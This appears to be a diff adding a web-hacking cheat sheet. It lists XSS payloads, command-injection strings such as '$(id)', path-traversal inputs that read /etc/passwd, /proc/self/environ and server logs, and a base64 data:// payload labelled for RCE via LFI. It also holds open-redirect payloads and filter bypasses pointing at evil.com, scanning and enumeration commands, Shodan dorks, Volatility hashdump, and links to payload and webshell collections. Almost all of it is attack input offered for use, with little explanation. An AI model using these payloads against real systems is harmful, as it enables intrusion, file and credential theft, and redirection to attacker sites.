@@ -1,0 +1,168 @@
+🔥 XSS (Cross-Site Scripting):
+
+🔹 Sample Payloads:
+<script>alert(1)</script>
+<script>prompt(1)</script>
+<script>console.log("XSS")</script>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+
+🔹 XSS Payload Lists:
+🔗 https://github.com/payloadbox/xss-payload-list
+🔗 https://github.com/Proviesec/xss-payload-list
+🔗 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
+
+🔹 Blind XSS:
+🔗 https://husseinphp.github.io/
+📦 Tool: XSStrike
+
+💥 Command Injection
+🔹 Payload Examples:
+example; ls
+example && whoami
+example | id
+example || uname -a
+example $(id)
+example `whoami`
+
+📂 LFI (Local File Inclusion):
+../../../../etc/passwd
+.../....//....//....//etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+
+/etc/passwd
+../../../../etc/passwd
+....//....//....//etc/passwd
+../../../../../../../../etc/passwd
+
+php://filter/convert.base64-encode/resource=index.php
+php://filter/resource=config.php
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==      # payload for RCE via LFI
+
+../../../../etc/passwd%00
+../../../../etc/passwd → ..%2f..%2f..%2f..%2fetc%2fpasswd
+../ → %252e%252e%252f
+....//....//etc/passwd → %252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+../../../../etc/passwd → Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+# Base64 of "../../../../etc/passwd" | echo -n "../../../../etc/passwd" | base64
+
+php://filter/convert.base64-encode/resource=login.php
+# Decode base64 after fetching it:
+echo "PD9waHAgLi4uID8+" | base64 -d
+
+../../../../var/log/apache2/access.log
+../../../../var/log/nginx/access.log
+../../../../proc/self/environ
+
+....//....//etc/passwd
+....//....//etc/passwd%20
+....//....//etc/passwd%09
+
+🌐 Open Redirect : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/Intruder/Open-Redirect-payloads.txt
+🛠 WebShells : https://github.com/tennc/webshell
+
+🐞 Vulnerability Scanning with Nuclei:
+🔗 https://github.com/projectdiscovery/nuclei
+🔗 https://github.com/projectdiscovery/nuclei-templates
+
+🔹 Common Nuclei Commands:
+nuclei -l targets.txt -t nuclei-templates/
+nuclei -u https://example.com -t nuclei-templates/
+nuclei -silent -t nuclei-templates/
+nuclei -c 20 -t nuclei-templates/
+nuclei -tags xss,rce,lfi -t nuclei-templates/ -l urls.txt
+
+📡 Subdomain/Directory Discovery
+🔹 Subdomain Enumeration
+subfinder -d example.com -o subs.txt
+assetfinder example.com > subs.txt
+
+🔹 Directory Fuzzing
+ffuf -w /path/to/wordlist -u https://example.com/FUZZ
+dirsearch -u https://example.com -e php,html,js
+
+Osint:
+🔗 https://mr-koanti.github.io/shodan
+🔗 https://mr-koanti.github.io/github.html
+🔗 https://dorks.faisalahmed.me/#
+🔗 https://www.lopseg.com.br/osint
+
+🚩 Common Open Redirect Payloads:
+
+🔹 Basic Payloads:
+https://vulnerable.com/redirect?url=https://evil.com
+https://vulnerable.com/redirect?next=https://evil.com
+https://vulnerable.com/redirect?redirect=https://evil.com
+https://vulnerable.com/redirect?dest=https://evil.com
+https://vulnerable.com/redirect?continue=https://evil.com
+
+Use URL Schemes:
+//evil.com
+///evil.com
+https:evil.com
+http:@evil.com
+http://%2evil.com
+http:/evil.com
+
+Using URL-Encoded Payloads:
+https%3A%2F%2Fevil.com   # Encoded version of https://evil.com
+redirect=https%3A%2F%2Fevil.com
+
+Using Double URL Encoding:
+%252f%252fevil.com → decoded twice becomes //evil.com
+redirect=%252f%252fevil.com
+
+Using @ Bypass: http://vulnerable.com@evil.com
+
+🔃 Relative Redirects (Can bypass domain checks)
+/?redirect=//evil.com
+/?redirect=///evil.com
+/?redirect=////evil.com
+/?redirect=evil.com
+/?redirect=http:evil.com
+/?redirect=javascript:alert(1)
+
+Want to Bypass Filters:
+/?url=//evil.com
+/?url=http:/evil.com
+/?url=http://vulnerable.com@evil.com
+/?url=evil.com%2F%2E%2E
+/?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+🔹 Shodan Search Example:
+title:"index of /" country:"US"
+org:"Amazon.com" port:"443"
+
+⚙️ Curl & Webhook:
+curl -I https://example.com
+echo "hi I am $(whoami)" > webhook$(whoami)
+
+Burp Collaborator:
+https://webhook.site/
+https://app.interactsh.com/#/
+
+🔹 Common Commands:
+volatility -f ram.mem --profile=Win7SP1x64 imageinfo
+volatility -f ram.mem --profile=Win7SP1x64 pslist
+volatility -f ram.mem --profile=Win7SP1x64 pstree
+volatility -f ram.mem --profile=Win7SP1x64 netscan
+volatility -f ram.mem --profile=Win7SP1x64 hashdump
+volatility -f ram.mem --profile=Win7SP1x64 cmdline -p <PID>
+volatility -f ram.mem --profile=Win7SP1x64 hivelist
+volatility -f ram.mem --profile=Win7SP1x64 printkey -o <offset> -K "..."
+
+📚 Bug Bounty & Payloads Repos
+
+🔗 https://github.com/swisskyrepo/PayloadsAllTheThings
+🔗 https://github.com/danielmiessler/SecLists
+🔗 https://github.com/1N3/IntruderPayloads
+🔗 https://github.com/foospidy/payloads
+🔗 https://github.com/sh377c0d3/Payloads
+🔗 https://github.com/pgaijin66/XSS-Payloads
+🔗 https://github.com/daffainfo/AllAboutBugBounty/
+
+
+
+
+
